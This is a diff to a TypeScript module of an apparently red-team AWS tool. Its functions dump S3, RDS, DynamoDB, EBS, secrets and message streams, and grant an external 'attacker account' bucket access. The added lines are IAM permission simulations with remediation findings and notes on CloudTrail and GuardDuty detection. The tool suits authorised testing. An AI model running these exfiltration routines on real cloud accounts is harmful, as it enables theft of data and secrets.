@@ -15,6 +15,19 @@ export async function s3Dump(args: string[], timeout: number): Promise<HookResul
     return { output: `[-] Invalid regex pattern: ${sensitivePattern}`, findings: [] }
   }
 
+  const findings: Finding[] = []
+
+  // Pre-flight: simulate S3 read permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["s3:ListBucket", "s3:GetObject", "s3:ListAllMyBuckets"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) findings.push({ checkId: "AWS-EXFIL-S3DUMP-001", provider: "aws", severity: "high", status: "FAIL", resource: `iam://${callerArn}`, title: `S3 dump actions permitted: ${allowed.join(", ")}`, details: `Can list and read S3 objects — sensitive file extraction possible`, remediation: "Restrict s3:GetObject and s3:ListBucket to least-privilege" })
+  }
+
   if (bucket) {
     const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
     if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
@@ -28,11 +41,14 @@ export async function s3Dump(args: string[], timeout: number): Promise<HookResul
         output.push(dl.exitCode === 0 ? `    Downloaded: ${key}` : `    Failed: ${key}`)
       }
     }
-    return { output: output.join("\n"), findings: [] }
+    output.push(`\n[*] Detection:`)
+    output.push(`  CloudTrail: ListObjectsV2, GetObject, CopyObject`)
+    output.push(`  GuardDuty: Exfiltration:S3/MaliciousIPCaller, Exfiltration:S3/AnomalousBehavior`)
+    return { output: output.join("\n"), findings }
   }
 
   const r = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
-  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings: [] }
+  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings }
   const buckets = tryJson(r.stdout) || []
   const output = [`[*] Found ${buckets.length} bucket(s)\n`]
 
@@ -47,7 +63,11 @@ export async function s3Dump(args: string[], timeout: number): Promise<HookResul
     for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
   }
 
-  return { output: output.join("\n"), findings: [] }
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: ListBuckets, ListObjectsV2, GetObject, CopyObject`)
+  output.push(`  GuardDuty: Exfiltration:S3/MaliciousIPCaller, Exfiltration:S3/AnomalousBehavior`)
+  output.push(`  Note: S3 data events (GetObject) require a separate CloudTrail data-event trail`)
+  return { output: output.join("\n"), findings }
 }
 
 export async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult> {
@@ -57,6 +77,19 @@ export async function ec2Snapshot(args: string[], timeout: number): Promise<Hook
   const region = argVal(args, "--region")
 
   if (!volumeId) return { output: "ERROR: --volume-id required", findings: [] }
+
+  const findings: Finding[] = []
+
+  // Pre-flight: simulate snapshot + sharing permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["ec2:CreateSnapshot", "ec2:ModifySnapshotAttribute", "ec2:CopySnapshot"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) findings.push({ checkId: "AWS-EXFIL-EC2SNAP-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `EC2 snapshot exfil actions permitted: ${allowed.join(", ")}`, details: `Can create snapshots and share cross-account for data exfiltration`, remediation: "Restrict ec2:CreateSnapshot and ec2:ModifySnapshotAttribute via IAM/SCP" })
+  }
 
   const r = await aws(
     [
@@ -73,7 +106,7 @@ export async function ec2Snapshot(args: string[], timeout: number): Promise<Hook
     region,
     timeout,
   )
-  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings: [] }
+  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }
   const snap = tryJson(r.stdout)
   const output = [`[+] Snapshot created: ${snap?.SnapshotId}`, `    Volume: ${volumeId}`, `    State: ${snap?.State}`]
 
@@ -100,7 +133,11 @@ export async function ec2Snapshot(args: string[], timeout: number): Promise<Hook
     )
   }
 
-  return { output: output.join("\n"), findings: [] }
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: CreateSnapshot, ModifySnapshotAttribute, CopySnapshot`)
+  output.push(`  GuardDuty: Exfiltration:S3/MaliciousIPCaller (cross-account share)`)
+  output.push(`  Note: Snapshot creation + cross-account share is VERY high-signal — commonly alerted`)
+  return { output: output.join("\n"), findings }
 }
 
 export async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
@@ -110,6 +147,17 @@ export async function rdsDump(args: string[], timeout: number): Promise<HookResu
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const findings: Finding[] = []
+
+  // Pre-flight: simulate RDS snapshot + share permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["rds:CreateDBSnapshot", "rds:ModifyDBSnapshotAttribute", "rds:RestoreDBInstanceFromDBSnapshot", "rds:CopyDBSnapshot"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) findings.push({ checkId: "AWS-EXFIL-RDS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `RDS exfil actions permitted: ${allowed.join(", ")}`, details: `Can snapshot, share, and restore databases — full data exfiltration possible`, remediation: "Restrict rds:CreateDBSnapshot and rds:ModifyDBSnapshotAttribute to admin roles" })
+  }
 
   if (!dbId) {
     const r = await aws(
@@ -232,6 +280,9 @@ export async function rdsDump(args: string[], timeout: number): Promise<HookResu
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: CreateDBSnapshot, ModifyDBSnapshotAttribute, RestoreDBInstanceFromDBSnapshot`)
+  output.push(`  Note: RDS snapshot creation + cross-account share is high-signal — monitored by AWS Config rules`)
   return { output: output.join("\n"), findings }
 }
 
@@ -242,6 +293,20 @@ export async function dynamodbDump(args: string[], timeout: number): Promise<Hoo
   const limit = argVal(args, "--limit") || "100"
   const output: string[] = ["[*] DynamoDB Data Extraction\n"]
   const findings: Finding[] = []
+
+  // Pre-flight: simulate DynamoDB read permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["dynamodb:Scan", "dynamodb:GetItem", "dynamodb:BatchGetItem", "dynamodb:ExportTableToPointInTime"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) {
+      output.push(`[!] DynamoDB exfil actions allowed: ${allowed.join(", ")}`)
+      findings.push({ checkId: "AWS-EXFIL-DDB-001", provider: "aws", severity: "high", status: "FAIL", resource: `iam://${callerArn}`, title: `DynamoDB read/export actions permitted: ${allowed.length}`, details: `Allowed: ${allowed.join(", ")} — full table scan and export possible`, remediation: "Restrict dynamodb:Scan and ExportTableToPointInTime to application roles only" })
+    }
+  }
 
   if (!tableName) {
     const tables = await aws(["dynamodb", "list-tables", "--query", "TableNames"], profile, region, timeout)
@@ -322,6 +387,9 @@ export async function dynamodbDump(args: string[], timeout: number): Promise<Hoo
     })
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: Scan, DescribeTable, ExportTableToPointInTime`)
+  output.push(`  Note: Full table Scan on large tables generates high read capacity — may trigger alarms`)
   return { output: output.join("\n"), findings }
 }
 
@@ -331,6 +399,20 @@ export async function ebsDirectRead(args: string[], timeout: number): Promise<Ho
   const region = argVal(args, "--region")
   const output: string[] = ["[*] EBS Direct API Snapshot Read\n"]
   const findings: Finding[] = []
+
+  // Pre-flight: simulate EBS direct read permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["ebs:ListSnapshotBlocks", "ebs:GetSnapshotBlock", "ebs:ListChangedBlocks"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) {
+      output.push(`[!] EBS Direct API actions allowed: ${allowed.join(", ")}`)
+      findings.push({ checkId: "AWS-EXFIL-EBS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `EBS Direct API access permitted — block-level snapshot read`, details: `Allowed: ${allowed.join(", ")} — can read raw disk data without mounting`, remediation: "Restrict ebs:GetSnapshotBlock and ebs:ListSnapshotBlocks — these APIs are rarely needed" })
+    }
+  }
 
   if (!snapshotId) {
     const snaps = await aws(
@@ -395,6 +477,9 @@ export async function ebsDirectRead(args: string[], timeout: number): Promise<Ho
   )
   output.push("[*] Block data can be reassembled into a raw disk image for offline analysis")
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: ListSnapshotBlocks, GetSnapshotBlock, ListChangedBlocks`)
+  output.push(`  Note: EBS Direct API usage is VERY unusual — high-signal for forensic/exfil activity`)
   return { output: output.join("\n"), findings }
 }
 
@@ -408,6 +493,18 @@ export async function s3Exfil(args: string[], timeout: number): Promise<HookResu
 
   if (!bucket) return { output: "ERROR: --bucket required", findings }
   if (!externalAccount) return { output: "ERROR: --external-account required (attacker account ID)", findings }
+
+  // Pre-flight: simulate bucket policy modification
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["s3:PutBucketPolicy", "s3:GetBucketPolicy", "s3:DeleteBucketPolicy"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    output.push(`[+] Bucket policy actions: ${allowed.length}/${actions.length} allowed`)
+    if (allowed.some((a: string) => a === "s3:PutBucketPolicy")) output.push(`[!] s3:PutBucketPolicy ALLOWED — can grant external account access`)
+  }
 
   const existing = await aws(["s3api", "get-bucket-policy", "--bucket", bucket], profile, region, timeout)
   let doc: Record<string, unknown> = { Version: "2012-10-17", Statement: [] }
@@ -453,6 +550,10 @@ export async function s3Exfil(args: string[], timeout: number): Promise<HookResu
     output.push(`[-] Policy modification failed: ${put.stderr.trim()}`)
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: PutBucketPolicy, GetBucketPolicy, DeleteBucketPolicy`)
+  output.push(`  GuardDuty: Policy:S3/BucketAnonymousAccessGranted, Exfiltration:S3/AnomalousBehavior`)
+  output.push(`  Note: Bucket policy modification is EXTREMELY high-signal — S3 Access Analyzer will flag immediately`)
   return { output: output.join("\n"), findings }
 }
 
@@ -467,6 +568,17 @@ export async function dataStage(args: string[], timeout: number): Promise<HookRe
 
   if (!sourcePath) return { output: "ERROR: --source required (local path or s3://)", findings }
   if (!destBucket) return { output: "ERROR: --dest-bucket required (staging bucket)", findings }
+
+  // Pre-flight: simulate S3 write for staging
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["s3:PutObject", "s3:CopyObject", "s3:GetObject"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) output.push(`[+] Staging permissions: ${allowed.join(", ")}`)
+  }
 
   if (sourcePath.startsWith("s3://")) {
     output.push(`[*] Source: ${sourcePath} (S3)`)
@@ -529,6 +641,9 @@ export async function dataStage(args: string[], timeout: number): Promise<HookRe
     remediation: "Delete staged data and review bucket access logs",
   })
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: PutObject, CopyObject, CompleteMultipartUpload`)
+  output.push(`  Note: Large data transfers to staging bucket generate S3 data events + VPC flow logs`)
   return { output: output.join("\n"), findings }
 }
 
@@ -538,6 +653,20 @@ export async function cleanupAws(args: string[], timeout: number): Promise<HookR
   const dryRun = hasFlag(args, "--dry-run")
   const mode = dryRun ? "DRY RUN" : "LIVE"
   const output = [`[*] CyberStrike AWS cleanup — ${mode}\n`]
+  const findings: Finding[] = []
+
+  // Pre-flight: simulate cleanup permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["ec2:DeleteSnapshot", "rds:DeleteDBSnapshot", "lambda:DeleteFunction", "iam:DeleteUser", "iam:DeleteRole", "cloudformation:DeleteStack"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    const denied = results.filter((r: Record<string, string>) => r.EvalDecision !== "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    output.push(`[+] Cleanup permissions: ${allowed.length} allowed, ${denied.length} denied`)
+    if (denied.length > 0) output.push(`[!] Cannot clean: ${denied.join(", ")}`)
+  }
 
   const snaps = await aws(
     [
@@ -750,7 +879,10 @@ export async function cleanupAws(args: string[], timeout: number): Promise<HookR
   }
 
   output.push(`\n[*] Cleanup ${mode} complete`)
-  return { output: output.join("\n"), findings: [] }
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: DeleteSnapshot, DeleteDBSnapshot, DeleteFunction, DeleteUser, DeleteRole, DeleteStack, StartLogging`)
+  output.push(`  Note: Cleanup itself generates CloudTrail events — the trail restart (StartLogging) is especially high-signal`)
+  return { output: output.join("\n"), findings }
 }
 
 export async function codecommitDump(args: string[], timeout: number): Promise<HookResult> {
@@ -760,6 +892,17 @@ export async function codecommitDump(args: string[], timeout: number): Promise<H
   const branch = argVal(args, "--branch")
   const findings: Finding[] = []
   const output: string[] = ["[*] CodeCommit Repository Dump\n"]
+
+  // Pre-flight: simulate CodeCommit read permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["codecommit:GitPull", "codecommit:GetRepository", "codecommit:GetFile", "codecommit:GetFolder"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) output.push(`[!] CodeCommit actions allowed: ${allowed.join(", ")}`)
+  }
 
   const repos = await aws(
     ["codecommit", "list-repositories", "--query", "repositories[].[repositoryName,repositoryId]"],
@@ -909,6 +1052,9 @@ export async function codecommitDump(args: string[], timeout: number): Promise<H
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: GitPull, GetFile, GetFolder, GetRepository, ListRepositories`)
+  output.push(`  Note: CodeCommit Git operations (clone/pull) are logged as GitPull events — unusual for non-developer accounts`)
   return { output: output.join("\n"), findings }
 }
 
@@ -919,6 +1065,17 @@ export async function ecrDump(args: string[], timeout: number): Promise<HookResu
   const pullImage = hasFlag(args, "--pull")
   const findings: Finding[] = []
   const output: string[] = ["[*] ECR Container Image Dump\n"]
+
+  // Pre-flight: simulate ECR pull permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["ecr:GetDownloadUrlForLayer", "ecr:BatchGetImage", "ecr:GetAuthorizationToken"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) output.push(`[!] ECR pull actions allowed: ${allowed.join(", ")}`)
+  }
 
   const repos = await aws(
     [
@@ -1060,6 +1217,9 @@ export async function ecrDump(args: string[], timeout: number): Promise<HookResu
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: GetAuthorizationToken, BatchGetImage, GetDownloadUrlForLayer, DescribeRepositories`)
+  output.push(`  Note: ECR auth token + image pull from unusual identity is high-signal — images may contain embedded secrets`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1071,6 +1231,17 @@ export async function athenaQuery(args: string[], timeout: number): Promise<Hook
   const outputBucket = argVal(args, "--output-bucket")
   const findings: Finding[] = []
   const output: string[] = ["[*] Athena Data Lake Query\n"]
+
+  // Pre-flight: simulate Athena query permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["athena:StartQueryExecution", "athena:GetQueryResults", "glue:GetTable", "s3:GetObject"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) output.push(`[!] Athena/Glue actions allowed: ${allowed.join(", ")}`)
+  }
 
   const catalogs = await aws(
     ["athena", "list-data-catalogs", "--query", "DataCatalogsSummary[].[CatalogName,Type]"],
@@ -1263,6 +1434,9 @@ export async function athenaQuery(args: string[], timeout: number): Promise<Hook
     output.push(`[-] Query status: ${queryStatus}`)
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: StartQueryExecution, GetQueryResults, GetQueryExecution`)
+  output.push(`  Note: Query text is logged in CloudTrail — reveals attacker intent; results written to S3 generate data events`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1273,6 +1447,20 @@ export async function secretsBulkExport(args: string[], timeout: number): Promis
   const format = argVal(args, "--format") || "json"
   const findings: Finding[] = []
   const output: string[] = ["[*] Secrets Bulk Export (Secrets Manager + SSM Parameter Store)\n"]
+
+  // Pre-flight: simulate secrets access — MAXIMUM signal actions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["secretsmanager:GetSecretValue", "secretsmanager:ListSecrets", "ssm:GetParameter", "ssm:GetParametersByPath"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) {
+      output.push(`[!] Secret access actions allowed: ${allowed.join(", ")}`)
+      findings.push({ checkId: "AWS-EXFIL-SECRETS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `Bulk secret access permitted: ${allowed.join(", ")}`, details: `Can read secrets from Secrets Manager and SSM Parameter Store`, remediation: "Restrict secretsmanager:GetSecretValue and ssm:GetParameter to application-specific resources" })
+    }
+  }
 
   const secrets: Record<string, string> = {}
 
@@ -1409,6 +1597,10 @@ export async function secretsBulkExport(args: string[], timeout: number): Promis
     output.push(`[*] Use --format env for KEY=VALUE format (default: json)`)
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: GetSecretValue, ListSecrets, GetParameter, DescribeParameters`)
+  output.push(`  GuardDuty: CredentialAccess:IAMUser/AnomalousBehavior`)
+  output.push(`  Note: GetSecretValue is MAXIMUM signal — bulk access from unusual identity triggers immediate alerts`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1417,6 +1609,20 @@ export async function backupVaultEnum(args: string[], timeout: number): Promise<
   const region = argVal(args, "--region")
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating AWS Backup vaults...\n"]
+
+  // Pre-flight: simulate backup vault access
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["backup:ListRecoveryPointsByBackupVault", "backup:GetRecoveryPointRestoreMetadata", "backup:StartRestoreJob"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.some((a: string) => a === "backup:StartRestoreJob")) {
+      output.push(`[!] Can start restore jobs — backup data exfiltration possible`)
+      findings.push({ checkId: "AWS-EXFIL-BACKUP-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `Backup restore permitted — can restore and exfil backed up data`, details: `Allowed: ${allowed.join(", ")}`, remediation: "Restrict backup:StartRestoreJob to recovery-specific roles" })
+    }
+  }
 
   const r = await aws(
     [
@@ -1509,6 +1715,9 @@ export async function backupVaultEnum(args: string[], timeout: number): Promise<
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: ListBackupVaults, ListRecoveryPointsByBackupVault, GetBackupVaultAccessPolicy, StartRestoreJob`)
+  output.push(`  Note: Backup vault enumeration + restore job is high-signal for data exfil via backup recovery`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1519,6 +1728,17 @@ export async function cloudwatchLogsDump(args: string[], timeout: number): Promi
   const maxGroups = parseInt(argVal(args, "--max-groups") || "10")
   const findings: Finding[] = []
   const output: string[] = ["[*] CloudWatch Logs extraction...\n"]
+
+  // Pre-flight: simulate CloudWatch Logs read permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["logs:GetLogEvents", "logs:FilterLogEvents", "logs:DescribeLogGroups", "logs:DescribeLogStreams"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) output.push(`[!] Log access actions allowed: ${allowed.join(", ")}`)
+  }
 
   const secretPattern =
     /(?:password|passwd|secret|api[_-]?key|token|bearer|authorization|aws_secret|private[_-]?key|connection[_-]?string|database_url|mongodb|postgres:\/\/|mysql:\/\/|redis:\/\/)/i
@@ -1617,6 +1837,9 @@ export async function cloudwatchLogsDump(args: string[], timeout: number): Promi
   output.push(`\n[+] Total secrets found in logs: ${totalSecrets}`)
   if (totalSecrets > 20) output.push(`[*] Only first 20 reported as findings`)
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: DescribeLogGroups, DescribeLogStreams, GetLogEvents, FilterLogEvents`)
+  output.push(`  Note: Bulk log retrieval across multiple groups is unusual — may trigger anomaly detection`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1627,6 +1850,21 @@ export async function snsSqsSiphon(args: string[], timeout: number): Promise<Hoo
   const targetQueue = argVal(args, "--queue")
   const findings: Finding[] = []
   const output: string[] = ["[*] SNS/SQS message interception...\n"]
+
+  // Pre-flight: simulate SNS/SQS interception permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["sqs:ReceiveMessage", "sns:Subscribe", "sns:ListSubscriptions", "sqs:GetQueueAttributes"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.some((a: string) => a === "sns:Subscribe")) {
+      output.push(`[!] sns:Subscribe ALLOWED — can add external subscription for persistent message siphon`)
+      findings.push({ checkId: "AWS-EXFIL-SNS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `SNS subscribe permitted — persistent message exfiltration possible`, details: `Can subscribe external endpoint to SNS topics for ongoing data capture`, remediation: "Restrict sns:Subscribe to specific topic ARNs and trusted endpoints" })
+    }
+    if (allowed.some((a: string) => a === "sqs:ReceiveMessage")) output.push(`[!] sqs:ReceiveMessage ALLOWED — can read queue messages`)
+  }
 
   const sensitivePattern = /(?:password|secret|token|key|credential|ssn|credit.?card|account.?number|authorization)/i
 
@@ -1761,6 +1999,9 @@ export async function snsSqsSiphon(args: string[], timeout: number): Promise<Hoo
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: ReceiveMessage, Subscribe, ListTopics, ListQueues, GetTopicAttributes, GetQueueAttributes`)
+  output.push(`  Note: SNS Subscribe to external HTTP/HTTPS endpoint is persistent exfil — survives credential rotation`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1770,6 +2011,20 @@ export async function kinesisTap(args: string[], timeout: number): Promise<HookR
   const streamName = argVal(args, "--stream-name")
   const findings: Finding[] = []
   const output: string[] = ["[*] Kinesis stream tap...\n"]
+
+  // Pre-flight: simulate Kinesis read permissions
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["kinesis:GetRecords", "kinesis:GetShardIterator", "kinesis:DescribeStream", "kinesis:ListStreams"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.some((a: string) => a === "kinesis:GetRecords")) {
+      output.push(`[!] kinesis:GetRecords ALLOWED — real-time stream data access possible`)
+      findings.push({ checkId: "AWS-EXFIL-KINESIS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `Kinesis stream read permitted — real-time data tap possible`, details: `Can read records from Kinesis data streams`, remediation: "Restrict kinesis:GetRecords and GetShardIterator to consumer applications only" })
+    }
+  }
 
   const r = await aws(["kinesis", "list-streams", "--query", "StreamNames"], profile, region, timeout)
   if (r.exitCode !== 0) return { output: `[-] Cannot list Kinesis streams: ${r.stderr.trim()}`, findings }
@@ -1862,6 +2117,9 @@ export async function kinesisTap(args: string[], timeout: number): Promise<HookR
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: ListStreams, DescribeStream, GetShardIterator, GetRecords`)
+  output.push(`  Note: Kinesis data stream access from non-consumer identity is high-signal — real-time data exposure`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1871,6 +2129,17 @@ export async function s3VersionRecovery(args: string[], timeout: number): Promis
   const targetBucket = argVal(args, "--bucket")
   const findings: Finding[] = []
   const output: string[] = ["[*] S3 Versioning & Deleted Object Recovery\n"]
+
+  // Pre-flight: simulate S3 version access
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
+  if (callerArn) {
+    const actions = ["s3:ListBucketVersions", "s3:GetObjectVersion", "s3:DeleteObject"]
+    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+    const results = tryJson(sim.stdout)?.EvaluationResults || []
+    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
+    if (allowed.length > 0) output.push(`[!] S3 version actions allowed: ${allowed.join(", ")}`)
+  }
 
   const bucketsCmd = targetBucket
     ? null
@@ -1994,6 +2263,13 @@ export async function s3VersionRecovery(args: string[], timeout: number): Promis
   }
 
